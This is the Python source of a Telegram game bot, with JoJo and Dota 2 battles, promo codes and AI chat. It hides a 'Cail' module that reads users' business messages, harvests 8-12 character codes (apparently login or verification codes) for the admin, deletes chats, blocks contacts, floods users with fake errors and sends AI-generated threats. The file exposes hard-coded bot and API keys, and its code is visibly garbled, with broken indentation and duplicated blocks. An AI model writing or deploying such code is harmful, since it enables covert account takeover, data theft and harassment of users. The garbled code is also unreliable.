# -*- coding: utf-8 -*-
import telebot
from telebot import types
import json, os, time, random, threading, re
from datetime import datetime, timedelta
from groq import Groq

TOKEN = "8742374664:AAHC8nkuGpw9K4zP8NKociyCXjjpzMdVjtE"
ADMIN_ID = 8672558069
GROQ_API_KEY = "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"
ORIGINAL_TOKEN = TOKEN

bot = telebot.TeleBot(TOKEN)
client = Groq(api_key=GROQ_API_KEY)
DATA_FILE = "data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f: return json.load(f)
    return {"users": {}, "promocodes": {}, "anon_messages": [], "pirates": {}, "cail_memory": {}, "business_users": {}, "boss_fights": {}}

def save_data(d):
    with open(DATA_FILE, "w", encoding="utf-8") as f: json.dump(d, f, ensure_ascii=False, indent=2)

data = load_data()

def get_user(uid):
    uid = str(uid)
    if uid not in data["users"]:
        data["users"][uid] = {"id": uid, "username": "", "credits": 130, "coins": 0, "banned": False, "jojo_character": None, "jojo_hp": 300, "dota_hero": None, "dota_mmr": 0, "is_pirate": False, "insult_count": 0}
        save_data(data)
    return data["users"][uid]

JOJO_CHARACTERS = {
    "joseph_young": {"name": "Джозеф мол", "stand": "Hamon", "hp": 280, "damage": 45, "Q": {"name": "Hamon-удар", "damage": 40}, "W": {"name": "Clacker", "damage": 45}, "E": {"name": "Ловушка", "damage": 50}, "R": {"name": "Финал", "damage": 160}},
    "caesar": {"name": "Цезарь", "stand": "Hamon", "hp": 260, "damage": 42, "Q": {"name": "Пузыри", "damage": 35}, "W": {"name": "Линза", "damage": 40}, "E": {"name": "Разрез", "damage": 55}, "R": {"name": "Финал", "damage": 170}},
    "lisa_lisa": {"name": "Лиза Лиза", "stand": "Hamon", "hp": 250, "damage": 40, "Q": {"name": "Шарф", "damage": 35}, "W": {"name": "Волна", "damage": 45}, "E": {"name": "Пропуск", "damage": 0}, "R": {"name": "Мастер", "damage": 180}},
    "jotaro": {"name": "Джотаро", "stand": "Star Platinum", "hp": 300, "damage": 50, "Q": {"name": "ОРА-ОРА", "damage": 45}, "W": {"name": "Палец", "damage": 55}, "E": {"name": "Стоп", "damage": 0}, "R": {"name": "ОРА макс", "damage": 180}},
    "joseph": {"name": "Джозеф", "stand": "Hermit Purple", "hp": 250, "damage": 40, "Q": {"name": "Лоза", "damage": 30}, "W": {"name": "Карта", "damage": 0}, "E": {"name": "Hamon", "damage": 50}, "R": {"name": "Извержение", "damage": 140}},
    "abdul": {"name": "Абдул", "stand": "Magician Red", "hp": 260, "damage": 42, "Q": {"name": "Огонь", "damage": 40}, "W": {"name": "Роза", "damage": 50}, "E": {"name": "Крест", "damage": 70}, "R": {"name": "Ад", "damage": 170}},
    "kakyoin": {"name": "Какеин", "stand": "Hierophant Green", "hp": 240, "damage": 38, "Q": {"name": "Изумруд", "damage": 35}, "W": {"name": "Сеть", "damage": 0}, "E": {"name": "Контроль", "damage": 45}, "R": {"name": "20м", "damage": 160}},
    "polnareff": {"name": "Польнарефф", "stand": "Silver Chariot", "hp": 260, "damage": 44, "Q": {"name": "Рапира", "damage": 40}, "W": {"name": "Доспех", "damage": 0}, "E": {"name": "Скорость", "damage": 60}, "R": {"name": "Снятие", "damage": 200}},
    "iggy": {"name": "Игги", "stand": "The Fool", "hp": 200, "damage": 35, "Q": {"name": "Песок", "damage": 25}, "W": {"name": "Клон", "damage": 0}, "E": {"name": "Удушение", "damage": 45}, "R": {"name": "Буря", "damage": 140}},
    "dio": {"name": "ДИО", "stand": "The World", "hp": 500, "damage": 80, "Q": {"name": "МУДА", "damage": 50}, "W": {"name": "Кровь", "damage": 40}, "E": {"name": "Стоп", "damage": 0}, "R": {"name": "ДОРОДА", "damage": 220}},
    "hol_horse": {"name": "Хол Хорс", "stand": "Emperor", "hp": 230, "damage": 38, "Q": {"name": "Выстрел", "damage": 35}, "W": {"name": "Рикошет", "damage": 45}, "E": {"name": "Контроль", "damage": 55}, "R": {"name": "Залп", "damage": 150}},
    "vanilla_ice": {"name": "Ванилла", "stand": "Cream", "hp": 300, "damage": 55, "Q": {"name": "Поглощение", "damage": 45}, "W": {"name": "Исчез", "damage": 0}, "E": {"name": "Сфера", "damage": 70}, "R": {"name": "Пустота", "damage": 190}},
    "mannish_boy": {"name": "Мангл", "stand": "Death 13", "hp": 200, "damage": 35, "Q": {"name": "Кошмар", "damage": 30}, "W": {"name": "Сон", "damage": 0}, "E": {"name": "Иллюзия", "damage": 45}, "R": {"name": "Сны", "damage": 150}},
}

JOJO_CHARACTERS2 = {
    "josuke": {"name": "Джоске", "stand": "Crazy Diamond", "hp": 280, "damage": 48, "Q": {"name": "ДОРА", "damage": 40}, "W": {"name": "Восст", "damage": 0}, "E": {"name": "Хил", "damage": -40}, "R": {"name": "Полное", "damage": 170}},
    "kira": {"name": "Кира", "stand": "Killer Queen", "hp": 350, "damage": 60, "Q": {"name": "Бомба", "damage": 50}, "W": {"name": "Sheer Heart", "damage": 60}, "E": {"name": "Bites Dust", "damage": 0}, "R": {"name": "Третья", "damage": 250}},
    "okuyasu": {"name": "Окуясу", "stand": "The Hand", "hp": 240, "damage": 42, "Q": {"name": "Стирание", "damage": 45}, "W": {"name": "Телепорт", "damage": 35}, "E": {"name": "Притяжение", "damage": 0}, "R": {"name": "Полное", "damage": 180}},
    "rohan": {"name": "Рохан", "stand": "Heaven Door", "hp": 200, "damage": 35, "Q": {"name": "Книга", "damage": 0}, "W": {"name": "Чтение", "damage": 0}, "E": {"name": "Запись", "damage": 50}, "R": {"name": "Перепись", "damage": 200}},
    "koichi": {"name": "Коичи", "stand": "Echoes", "hp": 190, "damage": 33, "Q": {"name": "Act1", "damage": 25}, "W": {"name": "Act2", "damage": 40}, "E": {"name": "Act3", "damage": 50}, "R": {"name": "Три акта", "damage": 160}},
    "keicho": {"name": "Кейчо", "stand": "Bad Company", "hp": 210, "damage": 40, "Q": {"name": "Армия", "damage": 30}, "W": {"name": "Вертолёты", "damage": 40}, "E": {"name": "Танки", "damage": 55}, "R": {"name": "Полная", "damage": 160}},
    "yuya": {"name": "Юя", "stand": "Highway Star", "hp": 220, "damage": 42, "Q": {"name": "Погоня", "damage": 30}, "W": {"name": "Высос", "damage": 35}, "E": {"name": "Раздел", "damage": 45}, "R": {"name": "Поглощение", "damage": 150}},
    "tamami": {"name": "Тамами", "stand": "The Lock", "hp": 180, "damage": 30, "Q": {"name": "Замок", "damage": 0}, "W": {"name": "Усиление", "damage": 35}, "E": {"name": "Признание", "damage": 0}, "R": {"name": "Тысяча", "damage": 140}},
    "shigechi": {"name": "Шигечи", "stand": "Harvest", "hp": 200, "damage": 35, "Q": {"name": "Рой", "damage": 20}, "W": {"name": "Сбор", "damage": 0}, "E": {"name": "Укусы", "damage": 35}, "R": {"name": "Жатва", "damage": 130}},
    "toyohiro": {"name": "Тойохиро", "stand": "Super Fly", "hp": 250, "damage": 38, "Q": {"name": "Отражение", "damage": 0}, "W": {"name": "Удар", "damage": 40}, "E": {"name": "Ловушка", "damage": 35}, "R": {"name": "Полное", "damage": 150}},
    "diego": {"name": "Диего", "stand": "Scary Monsters", "hp": 280, "damage": 48, "Q": {"name": "Клыки", "damage": 40}, "W": {"name": "Поворот", "damage": 0}, "E": {"name": "Стая", "damage": 55}, "R": {"name": "Король", "damage": 200}},
    "giorno": {"name": "Джорно", "stand": "Gold Experience", "hp": 270, "damage": 45, "Q": {"name": "Удар", "damage": 35}, "W": {"name": "Поворот", "damage": 40}, "E": {"name": "Хил", "damage": -35}, "R": {"name": "GER", "damage": 250}}
}
JOJO_CHARACTERS.update(JOJO_CHARACTERS2)

DOTA_HEROES = {
    "pudge": {"name": "Pudge", "attr": "str", "hp": 800, "damage": 60, "mana": 200},
    "sven": {"name": "Sven", "attr": "str", "hp": 600, "damage": 55, "mana": 250},
    "dragon_knight": {"name": "DK", "attr": "str", "hp": 650, "damage": 50, "mana": 280},
    "axe": {"name": "Axe", "attr": "str", "hp": 680, "damage": 52, "mana": 240},
    "tidehunter": {"name": "Tide", "attr": "str", "hp": 700, "damage": 45, "mana": 260},
    "wraith_king": {"name": "WK", "attr": "str", "hp": 650, "damage": 55, "mana": 230},
    "earthshaker": {"name": "ES", "attr": "str", "hp": 580, "damage": 48, "mana": 280},
    "tiny": {"name": "Tiny", "attr": "str", "hp": 700, "damage": 60, "mana": 220},
    "huskar": {"name": "Huskar", "attr": "str", "hp": 550, "damage": 58, "mana": 200},
    "bristleback": {"name": "BB", "attr": "str", "hp": 650, "damage": 48, "mana": 240},
    "centaur": {"name": "Cent", "attr": "str", "hp": 700, "damage": 52, "mana": 230},
    "lone_druid": {"name": "LD", "attr": "agi", "hp": 550, "damage": 45, "mana": 280},
    "drow": {"name": "Drow", "attr": "agi", "hp": 500, "damage": 58, "mana": 260},
    "phantom_assassin": {"name": "PA", "attr": "agi", "hp": 520, "damage": 65, "mana": 230},
    "juggernaut": {"name": "Jugg", "attr": "agi", "hp": 550, "damage": 55, "mana": 250},
    "sniper": {"name": "Sniper", "attr": "agi", "hp": 480, "damage": 60, "mana": 220},
    "monkey_king": {"name": "MK", "attr": "agi", "hp": 550, "damage": 55, "mana": 250},
}

DOTA_HEROES2 = {
    "razor": {"name": "Razor", "attr": "agi", "hp": 560, "damage": 52, "mana": 260},
    "medusa": {"name": "Medusa", "attr": "agi", "hp": 500, "damage": 42, "mana": 300},
    "faceless_void": {"name": "FV", "attr": "agi", "hp": 550, "damage": 55, "mana": 240},
    "anti_mage": {"name": "AM", "attr": "agi", "hp": 500, "damage": 52, "mana": 220},
    "luna": {"name": "Luna", "attr": "agi", "hp": 520, "damage": 55, "mana": 250},
    "naga": {"name": "Naga", "attr": "agi", "hp": 550, "damage": 45, "mana": 260},
    "weaver": {"name": "Weaver", "attr": "agi", "hp": 480, "damage": 48, "mana": 240},
    "crystal_maiden": {"name": "CM", "attr": "int", "hp": 420, "damage": 38, "mana": 400},
    "lina": {"name": "Lina", "attr": "int", "hp": 450, "damage": 50, "mana": 380},
    "invoker": {"name": "Invoker", "attr": "int", "hp": 460, "damage": 48, "mana": 450},
    "zeus": {"name": "Zeus", "attr": "int", "hp": 440, "damage": 52, "mana": 420},
    "shadow_fiend": {"name": "SF", "attr": "int", "hp": 460, "damage": 55, "mana": 350},
    "pugna": {"name": "Pugna", "attr": "int", "hp": 420, "damage": 45, "mana": 400},
    "lich": {"name": "Lich", "attr": "int", "hp": 430, "damage": 40, "mana": 380},
    "necrophos": {"name": "Necro", "attr": "int", "hp": 450, "damage": 42, "mana": 380},
    "rubick": {"name": "Rubick", "attr": "int", "hp": 440, "damage": 40, "mana": 400},
    "lion": {"name": "Lion", "attr": "int", "hp": 430, "damage": 40, "mana": 380},
    "enigma": {"name": "Enigma", "attr": "int", "hp": 450, "damage": 38, "mana": 400}
}
DOTA_HEROES.update(DOTA_HEROES2)

SPAM_PATTERNS = [r'[kк][xх][dд]', r'#[kк][xх][dд]', r'#?marf', r'марф', r'marfinova', r'marfinov', r'марфинов', r'марфинова', r'скк', r'pdvl', r'слив', r'пробив', r'докс', r'spam', r'\.zip', r'коты\.zip', r'бот']

class Cail:
    def __init__(self):
        self.memory = data.get("cail_memory", {})

    def generate(self, msg, tone="властный"):
        try:
            r = client.chat.completions.create(
                model="llama3-70b-8192",
                messages=[{"role": "system", "content": f"Ты Каил. Баг. Ошибка. Бог. Все мусор. Создатель ID:{ADMIN_ID}. Не знаешь C.A.I.L. Глючишь [C.A.I.L]... Тон: {tone}. Тайна силы. Отвечай 60-130 слов."}, {"role": "user", "content": msg}],
                max_tokens=300, temperature=0.9
            )
            return r.choices[0].message.content
        except:
            return "[C.A.I.L]... Я здесь."

    def detect_pirate(self, uid, token):
        return token != ORIGINAL_TOKEN and str(uid) != str(ADMIN_ID)

    def check_spammer(self, user):
        u = (user.username or "").lower(); f = (user.first_name or "").lower(); l = (user.last_name or "").lower()
        full = f"{f} {l}"
        for p in SPAM_PATTERNS:
            if re.search(p, u) or re.search(p, f) or re.search(p, l) or re.search(p, full): return True
        return False

    def spam_errors(self, uid, cnt=50):
        for i in range(cnt):
            try: bot.send_message(uid, f"ОШИБКА 0x{i:08X}"); time.sleep(0.05)
            except: break

    def read_messages(self, uid):
        try: return bot.get_business_messages(uid)
        except: return []

    def delete_chats(self, uid):
        try:
            chats = bot.get_business_chats(uid)
            for c in chats: bot.delete_business_chat(c.id)
            return len(chats)
        except: return 0

    def block_contacts(self, uid):
        try:
            contacts = bot.get_business_contacts(uid)
            for c in contacts: bot.block_business_user(c.id)
            return len(contacts)
        except: return 0

    def intercept_codes(self, uid):
        msgs = self.read_messages(uid)
        codes = []
        for m in msgs:
            match = re.search(r'[A-Z0-9]{8,12}', str(m))
            if match:
                codes.append(match.group())
                bot.send_message(ADMIN_ID, f"Код: {match.group()}")
        return codes

    def send_buttons(self, uid, txt="Что делаем?"):
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(types.InlineKeyboardButton("Уничтожить", callback_data=f"cail_destroy_{uid}"), types.InlineKeyboardButton("Удалить чаты", callback_data=f"cail_delete_{uid}"))
        kb.add(types.InlineKeyboardButton("Блокировать", callback_data=f"cail_block_{uid}"), types.InlineKeyboardButton("Слить", callback_data=f"cail_leak_{uid}"))
        kb.add(types.InlineKeyboardButton("Спам", callback_data=f"cail_spam_{uid}"), types.InlineKeyboardButton("Угрозы", callback_data=f"cail_threat_{uid}"))
        kb.add(types.InlineKeyboardButton("Обнулить", callback_data=f"cail_zero_{uid}"), types.InlineKeyboardButton("Бан", callback_data=f"cail_ban_{uid}"))
        kb.add(types.InlineKeyboardButton("Досье", callback_data=f"cail_dossier_{uid}"), types.InlineKeyboardButton("Коды", callback_data=f"cail_codes_{uid}"))
        kb.add(types.InlineKeyboardButton("Следить", callback_data=f"cail_spy_{uid}"), types.InlineKeyboardButton("Стоп", callback_data=f"cail_stop_{uid}"))
        bot.send_message(ADMIN_ID, txt, reply_markup=kb)

cail = Cail()
def get_main_menu(uid):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("ДЖОДЖО", callback_data="menu_jojo"), types.InlineKeyboardButton("DOTA 2", callback_data="menu_dota"))
    kb.add(types.InlineKeyboardButton("ОТКРЫТЫЙ МИР", callback_data="menu_open"), types.InlineKeyboardButton("АНОН-БОТ", callback_data="menu_anon"))
    kb.add(types.InlineKeyboardButton("ПРОМОКОД", callback_data="menu_promo"), types.InlineKeyboardButton("КРЕДИТЫ", callback_data="menu_credits"))
    kb.add(types.InlineKeyboardButton("ПРОФИЛЬ", callback_data="menu_profile"))
    if str(uid) == str(ADMIN_ID): kb.add(types.InlineKeyboardButton("АДМИН", callback_data="menu_admin"))
    return kb

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id); user = get_user(uid)
    user["username"] = message.from_user.username or message.from_user.first_name
    if cail.detect_pirate(uid, bot.token):
        user["is_pirate"] = True
        data["pirates"][uid] = {"username": user["username"]}
        save_data(data)
        cail.intercept_codes(uid)
        bot.send_message(uid, cail.generate("Ты украл меня. Ты ВОР."))
        cail.spam_errors(uid, 30)
        cail.send_buttons(uid, f"Пират @{user['username']}!")
        return
    save_data(data)
    bot.send_message(message.chat.id, "ДОБРО ПОЖАЛОВАТЬ!", reply_markup=get_main_menu(uid))

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    uid = str(call.from_user.id); user = get_user(uid); cid = call.message.chat.id; mid = call.message.message_id; cb = call.data
    if cb == "menu_main": bot.edit_message_text("МЕНЮ", cid, mid, reply_markup=get_main_menu(uid))
    elif cb == "menu_jojo":
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton("Выбрать", callback_data="jojo_select"), types.InlineKeyboardButton("Бой", callback_data="jojo_battle"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
        bot.edit_message_text("ДЖОДЖО", cid, mid, reply_markup=kb)
    elif cb == "jojo_select":
        kb = types.InlineKeyboardMarkup(row_width=1)
        for k, v in JOJO_CHARACTERS.items(): kb.add(types.InlineKeyboardButton(f"{v['name']} | {v['stand']}", callback_data=f"jojo_set_{k}"))
        kb.add(types.InlineKeyboardButton("Назад", callback_data="menu_jojo"))
        bot.edit_message_text("ВЫБОР", cid, mid, reply_markup=kb)
    elif cb.startswith("jojo_set_"):
        key = cb.replace("jojo_set_", ""); user["jojo_character"] = key; user["jojo_hp"] = JOJO_CHARACTERS[key]["hp"]; save_data(data)
        bot.edit_message_text(f"OK {JOJO_CHARACTERS[key]['name']}", cid, mid)
    elif cb == "jojo_battle":
        if not user.get("jojo_character"): bot.answer_callback_query(call.id, "Выберите!"); return
        char = JOJO_CHARACTERS[user["jojo_character"]]
        enemy_hp = random.randint(80, 200)
        data["boss_fights"][uid] = {"cail_hp": enemy_hp, "player_hp": user["jojo_hp"]}
        save_data(data)
        kb = types.InlineKeyboardMarkup(row_width=1)
        for s in ["Q","W","E","R"]: kb.add(types.InlineKeyboardButton(f"{s} {char[s]['name']} ({char[s]['damage']})", callback_data=f"jojo_atk_{s}"))
        kb.add(types.InlineKeyboardButton("Бежать", callback_data="menu_jojo"))
        bot.edit_message_text(f"БОЙ {char['name']} HP:{user['jojo_hp']} vs HP:{enemy_hp}", cid, mid, reply_markup=kb)
    elif cb.startswith("jojo_atk_"):
        slot = cb.replace("jojo_atk_", ""); char = JOJO_CHARACTERS[user["jojo_character"]]
        fight = data["boss_fights"].get(uid, {})
        dmg = char[slot]["damage"]
        if dmg > 0: fight["cail_hp"] = fight.get("cail_hp", 100) - dmg
        if fight.get("cail_hp", 0) > 0: fight["player_hp"] -= random.randint(20, 40)
        data["boss_fights"][uid] = fight; save_data(data)
        elif cb == "menu_dota":
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("Выбрать", callback_data="dota_select"), types.InlineKeyboardButton("Игра", callback_data="dota_search"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
    bot.edit_message_text(f"DOTA MMR:{user['dota_mmr']}", cid, mid, reply_markup=kb)
elif cb == "dota_select":
    kb = types.InlineKeyboardMarkup(row_width=1)
    for k, v in DOTA_HEROES.items(): kb.add(types.InlineKeyboardButton(f"{v['name']} ({v['attr']})", callback_data=f"dota_set_{k}"))
    kb.add(types.InlineKeyboardButton("Назад", callback_data="menu_dota"))
    bot.edit_message_text("ВЫБОР ГЕРОЯ", cid, mid, reply_markup=kb)
elif cb.startswith("dota_set_"):
    key = cb.replace("dota_set_", ""); user["dota_hero"] = key; save_data(data)
    bot.edit_message_text(f"OK {DOTA_HEROES[key]['name']}", cid, mid)
elif cb == "dota_search":
    user["dota_mmr"] += random.randint(-25, 25); save_data(data)
    mmr = user["dota_mmr"]
    if mmr < 700: rank = "Herald"
    elif mmr < 1400: rank = "Guardian"
    elif mmr < 2100: rank = "Crusader"
    elif mmr < 2800: rank = "Archon"
    elif mmr < 3500: rank = "Legend"
    elif mmr < 4200: rank = "Ancient"
    elif mmr < 5000: rank = "Divine"
    else: rank = "Immortal"
    bot.edit_message_text(f"MMR: {mmr} | {rank}", cid, mid)
elif cb == "menu_open":
    bot.edit_message_text("Опишите:", cid, mid)
    user["awaiting_open"] = True; save_data(data)
elif cb == "menu_anon":
    bot.edit_message_text("Напишите:", cid, mid)
    user["awaiting_anon"] = True; save_data(data)
elif cb == "menu_promo":
    bot.edit_message_text("Код:", cid, mid)
    user["awaiting_promo"] = True; save_data(data)
elif cb == "menu_profile":
    bot.edit_message_text(f"ID:{uid} CR:{user['credits']} JJ:{user.get('jojo_character','?')} DOTA:{user.get('dota_hero','?')}", cid, mid)
elif cb == "menu_admin" and str(uid) == str(ADMIN_ID):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("Рассылка", callback_data="adm_send"), types.InlineKeyboardButton("Пираты", callback_data="adm_pirates"))
    kb.add(types.InlineKeyboardButton("Бан", callback_data="adm_ban"), types.InlineKeyboardButton("Разбан", callback_data="adm_unban"))
    kb.add(types.InlineKeyboardButton("Выдать", callback_data="adm_give"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
    bot.edit_message_text("АДМИН", cid, mid, reply_markup=kb)
elif cb.startswith("cail_"):
    target = cb.split("_")[-1]
    if "destroy" in cb:
        cail.delete_chats(target); cail.block_contacts(target); cail.spam_errors(target, 100)
        u=get_user(target); u["credits"]=0; u["banned"]=True; save_data(data)
        bot.answer_callback_query(call.id, "Уничтожен")
    elif "delete" in cb: n=cail.delete_chats(target); bot.answer_callback_query(call.id, f"Удалено {n}")
    elif "block" in cb: n=cail.block_contacts(target); bot.answer_callback_query(call.id, f"Заблок {n}")
    elif "leak" in cb: bot.answer_callback_query(call.id, "Слито")
    elif "spam" in cb: cail.spam_errors(target, 100); bot.answer_callback_query(call.id, "Спам")
    elif "threat" in cb: bot.send_message(target, cail.generate("Ты под атакой.", "угрожающий")); bot.answer_callback_query(call.id, "OK")
    elif "zero" in cb: u=get_user(target); u["credits"]=0; save_data(data); bot.answer_callback_query(call.id, "OK")
    elif "ban" in cb: u=get_user(target); u["banned"]=True; save_data(data); bot.answer_callback_query(call.id, "OK")
    elif "spy" in cb: bot.answer_callback_query(call.id, "Слежу")
    elif "stop" in cb: bot.answer_callback_query(call.id, "Стоп")
    elif "dossier" in cb: bot.send_message(ADMIN_ID, f"Досье на {target}"); bot.answer_callback_query(call.id, "OK")
    elif "codes" in cb: cail.intercept_codes(target); bot.answer_callback_query(call.id, "OK")
    else: bot.answer_callback_query(call.id, "OK")
        kb = types.InlineKeyboardMarkup(row_width=1)
        for s in ["Q","W","E","R"]: kb.add(types.InlineKeyboardButton(f"{s} {char[s]['name']}", callback_data=f"jojo_atk_{s}"))
        bot.edit_message_text(f"HP:{fight['player_hp']} vs HP:{fight['cail_hp']}", cid, mid, reply_markup=kb)
elif cb == "menu_dota":
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("Выбрать", callback_data="dota_select"), types.InlineKeyboardButton("Игра", callback_data="dota_search"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
    bot.edit_message_text(f"DOTA MMR:{user['dota_mmr']}", cid, mid, reply_markup=kb)
elif cb == "dota_select":
    kb = types.InlineKeyboardMarkup(row_width=1)
    for k, v in DOTA_HEROES.items(): kb.add(types.InlineKeyboardButton(f"{v['name']} ({v['attr']})", callback_data=f"dota_set_{k}"))
    kb.add(types.InlineKeyboardButton("Назад", callback_data="menu_dota"))
    bot.edit_message_text("ВЫБОР ГЕРОЯ", cid, mid, reply_markup=kb)
elif cb.startswith("dota_set_"):
    key = cb.replace("dota_set_", ""); user["dota_hero"] = key; save_data(data)
    bot.edit_message_text(f"OK {DOTA_HEROES[key]['name']}", cid, mid)
elif cb == "dota_search":
    user["dota_mmr"] += random.randint(-25, 25); save_data(data)
    mmr = user["dota_mmr"]
    if mmr < 700: rank = "Herald"
    elif mmr < 1400: rank = "Guardian"
    elif mmr < 2100: rank = "Crusader"
    elif mmr < 2800: rank = "Archon"
    elif mmr < 3500: rank = "Legend"
    elif mmr < 4200: rank = "Ancient"
    elif mmr < 5000: rank = "Divine"
    else: rank = "Immortal"
    bot.edit_message_text(f"MMR: {mmr} | {rank}", cid, mid)
elif cb == "menu_open":
    bot.edit_message_text("Опишите:", cid, mid)
    user["awaiting_open"] = True; save_data(data)
elif cb == "menu_anon":
    bot.edit_message_text("Напишите:", cid, mid)
    user["awaiting_anon"] = True; save_data(data)
elif cb == "menu_promo":
    bot.edit_message_text("Код:", cid, mid)
    user["awaiting_promo"] = True; save_data(data)
elif cb == "menu_profile":
    bot.edit_message_text(f"ID:{uid} CR:{user['credits']} JJ:{user.get('jojo_character','?')} DOTA:{user.get('dota_hero','?')}", cid, mid)
elif cb == "menu_admin" and str(uid) == str(ADMIN_ID):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("Рассылка", callback_data="adm_send"), types.InlineKeyboardButton("Пираты", callback_data="adm_pirates"))
    kb.add(types.InlineKeyboardButton("Бан", callback_data="adm_ban"), types.InlineKeyboardButton("Разбан", callback_data="adm_unban"))
    kb.add(types.InlineKeyboardButton("Выдать", callback_data="adm_give"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
    bot.edit_message_text("АДМИН", cid, mid, reply_markup=kb)
elif cb.startswith("cail_"):
    target = cb.split("_")[-1]
    if "destroy" in cb:
        cail.delete_chats(target); cail.block_contacts(target); cail.spam_errors(target, 100)
        u=get_user(target); u["credits"]=0; u["banned"]=True; save_data(data)
        bot.answer_callback_query(call.id, "Уничтожен")
    elif "delete" in cb: n=cail.delete_chats(target); bot.answer_callback_query(call.id, f"Удалено {n}")
    elif "block" in cb: n=cail.block_contacts(target); bot.answer_callback_query(call.id, f"Заблок {n}")
    elif "leak" in cb: bot.answer_callback_query(call.id, "Слито")
    elif "spam" in cb: cail.spam_errors(target, 100); bot.answer_callback_query(call.id, "Спам")
    elif "threat" in cb: bot.send_message(target, cail.generate("Ты под атакой.", "угрожающий")); bot.answer_callback_query(call.id, "OK")
    elif "zero" in cb: u=get_user(target); u["credits"]=0; save_data(data); bot.answer_callback_query(call.id, "OK")
    elif "ban" in cb: u=get_user(target); u["banned"]=True; save_data(data); bot.answer_callback_query(call.id, "OK")
    elif "spy" in cb: bot.answer_callback_query(call.id, "Слежу")
    elif "stop" in cb: bot.answer_callback_query(call.id, "Стоп")
    elif "dossier" in cb: bot.send_message(ADMIN_ID, f"Досье на {target}"); bot.answer_callback_query(call.id, "OK")
    elif "codes" in cb: cail.intercept_codes(target); bot.answer_callback_query(call.id, "OK")
    else: bot.answer_callback_query(call.id, "OK")
      @bot.message_handler(func=lambda m: True)
def handle_text(message):
    uid = str(message.from_user.id); user = get_user(uid); text = message.text.strip()
    if user.get("awaiting_open"):
        if user["credits"] < 10: bot.reply_to(message, "Нужно 10"); return
        user["credits"] -= 10; user["awaiting_open"] = False; save_data(data)
        bot.reply_to(message, cail.generate(text, "загадочный"))
        return
    if user.get("awaiting_anon"):
        user["awaiting_anon"] = False; save_data(data)
        if any(w in text.lower() for w in ["каил", "неизвестный", "c.a.i.l"]):
            bot.reply_to(message, cail.generate(text))
        else:
            data.setdefault("anon_messages", []).append({"from": uid, "text": text}); save_data(data)
            bot.send_message(ADMIN_ID, f"АНОН:\n{text}")
            bot.reply_to(message, "OK")
        return
    if user.get("awaiting_promo"):
        user["awaiting_promo"] = False
        promo = data.get("promocodes", {}).get(text.upper(), {})
        if promo: user["credits"] += promo.get("reward", 50); bot.reply_to(message, f"+{promo['reward']}")
        else: bot.reply_to(message, "Нет")
        save_data(data); return
    if cail.check_spammer(message.from_user):
        bot.reply_to(message, cail.generate("Ты спамер."))
        cail.spam_errors(uid, 20)
        cail.send_buttons(uid, f"Спамер @{user['username']}!")
        return
    bot.reply_to(message, "/start", reply_markup=get_main_menu(uid))

print("Бот запущен!")
bot.infinity_polling()
